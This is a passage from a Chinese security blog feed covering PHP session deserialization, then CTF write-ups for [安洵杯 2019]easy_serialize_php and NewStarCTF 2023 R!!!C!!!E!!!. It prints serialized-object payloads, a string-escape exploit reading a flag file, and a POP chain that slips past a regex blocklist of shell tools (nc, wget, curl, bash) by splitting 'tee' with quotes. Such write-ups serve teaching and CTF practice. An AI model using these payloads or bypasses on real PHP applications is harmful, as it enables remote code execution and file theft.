src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161544088.png" alt="img"></p><p>可以看到数据是以序列化的状态存储在文件中的</p><p>那就是HTTP请求一个页面后，如果用到开启session，会去读COOKIE中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入COOKIE中的PHPSESSID中，再生成一个sess_前缀文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。当读取到session变量的时候，先会读取COOKIE中的PHPSESSID，获得session_id，然后再去找这个sess_session_id文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成session_id和sess_session_id这个文件。</p><h2 id="SESSION模块的参数含义"><a href="#SESSION模块的参数含义" class="headerlink" title="SESSION模块的参数含义"></a>SESSION模块的参数含义</h2><table><thead><tr><th align="center"><strong>Directive</strong></th><th align="center"><strong>含义</strong></th></tr></thead><tbody><tr><td align="center">session.save_handler</td><td align="center">session保存形式。默认为files</td></tr><tr><td align="center">session.save_path</td><td align="center">session保存路径。</td></tr><tr><td align="center">session.serialize_handler</td><td align="center">session序列化存储所用处理器。默认为php。</td></tr><tr><td align="center">session.upload_progress.cleanup</td><td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td></tr><tr><td align="center">session.upload_progress.enabled</td><td align="center">将上传文件的进度信息存在session中。默认开启。</td></tr></tbody></table><p>主要有三种处理器</p><p>当 <strong>session.serialize_handler&#x3D;php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p><p>当 <strong>session.serialize_handler&#x3D;php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p><p>当 <strong>session.serialize_handler&#x3D;php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p><p>可以用ini_set来改变处理器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p><h2 id="SESSION的反序列化"><a href="#SESSION的反序列化" class="headerlink" title="SESSION的反序列化"></a>SESSION的反序列化</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161556577.png" alt="img"></p><p>这也就是SESSION反序列化的切入点了，我们可以直接通过写入SESSION文件，然后请求页面，让php自行将我们的序列化字符串进行反序列化，但是因为我们传入的是键值对，那么<code>session</code>序列化存储所用的处理器肯定也是将这个键值对写了进去，怎么才能让它正好反序列化到我们传入的内容。</p><p>这里就要用到我们上面介绍到的不同序列化处理器的特性，我们可以在我们传入的序列化内容前面加一个|,在php_serialize处理后会返回一个序列化后的数组，但是在使用php处理器会以竖线|作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行反序列化操作，这样就能够实现我们session反序列化操作。</p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?test=|O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="小试牛刀—-安洵杯-2019-easy-serialize-php（session反序列化-减逃逸）"><a href="#小试牛刀—-安洵杯-2019-easy-serialize-php（session反序列化-减逃逸）" class="headerlink" title="小试牛刀—-[安洵杯 2019]easy_serialize_php（session反序列化+减逃逸）"></a>小试牛刀—-[安洵杯 2019]easy_serialize_php（session反序列化+减逃逸）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161622229.png" alt="img"></p><p>传入phpinfo看一下</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161724600.png"></p><p>可以看到，反序列化处理器是php，文件提示，d0g3_f1ag.php</p><p>那么看代码可以知道，我们的目的是执行<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>这个函数，并且一看就知道还是字符串减少的字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">看代码，需要满足f=show_image,让字符串逃逸</span><br><span class="line">原始字符串为</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">序列化一下看看</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">a:<span class="number">3</span>：&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br><span class="line">现在要把img给弄成ZDBnM19mMWFnLnBocA==（d0g3_flag.php的base64编码）</span><br><span class="line">从user下手，把guest<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image给吞掉，然后自己再造个键值对</span></span><br><span class="line"><span class="string">即</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"><span class="subst">$_SESSION</span>[&quot;</span>user<span class="string">&quot;] = &#x27;flagflagflagflagflagflag&#x27;;</span></span><br><span class="line"><span class="string"><span class="subst">$_SESSION</span>[&#x27;function&#x27;] = &#x27;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$_SESSION[&#x27;</span>dd<span class="string">&#x27;] = base64_encode(&#x27;</span>d0g3_f1ag.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">echo serialize($_SESSION);</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:79:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:2:&quot;dd&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0Dg7=YqBK0QD/iW4nrBeIe0K=Qx">带你走进PHP session反序列化漏洞</a></p><p><a href="https://www.cnblogs.com/GTL-JU/p/16859098.html">session反序列化</a></p><p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%B8%80">PHP反序列化入门之phar</a></p><p><a href="https://www.cnblogs.com/CoLo/p/16786627.html">PHP Phar反序列化学习</a></p><p><a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化总结</a></p><p><a href="https://xz.aliyun.com/t/9213?time__1311=n4+xnD0DuAG=oxGqGNnmDUxYqxEkDcAA2xmupD">PHP反序列化 — 字符逃逸</a></p><p><a href="https://xz.aliyun.com/t/9895?time__1311=n4+xnD0DuDRD9B7NDsAoxCqw0r7ei=37tH4D">通过CTF题目学习反序列化字符串逃逸</a></p><p><a href="https://cloud.tencent.com/developer/article/2226541">干货 | 能看懂的PHP反序列化字符逃逸漏洞</a></p><p><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化入门之session反序列化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -php反序列化 -session反序列化 -phar反序列化 -php pop链 -php字符串逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NewStarCTF 2023 公开赛道]RCE-无回显RCE</title>
      <link href="/2024/07/11/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-RCE-%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
      <url>/2024/07/11/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-RCE-%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-公开赛道-R-C-E"><a href="#NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!"></a>[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!</h1><p>这道题是反序列化+无回显RCE</p><p>关键点：<a href="https://blog.csdn.net/G_D0120/article/details/136567416">tee命令</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>源码如上，一眼就是反序列化，直接构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//创建对象</span></span><br><span class="line"><span class="variable">$m</span>-&gt;qwejaskdjnlka=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();  <span class="comment">//触发__toString()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);  <span class="comment">//序列化对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是当我交上去的时候发现没有回应</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111110617.png" alt="img"></p><p>一直以为是没有执行成功，后来经过大佬指点才知道是<strong>无回显</strong>，那么无回显RCE该怎么利用呢，就是把执行结果输出到一个文件里，然后访问这个文件就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls /|t&#x27;&#x27;ee 1&quot;</span>; <span class="comment">//tee命令输出到 1 文件，用&#x27;&#x27;绕过</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;qwejaskdjnlka=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111116995.png" alt="img"></p><p>然后执行cat &#x2F;flag_is_h3eeere|t’’ee 1命令，直接读取flag</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111120971.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -RCE -反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE外部注入实体漏洞_php</title>
      <link href="/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/"/>
      <url>/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/</url>
      
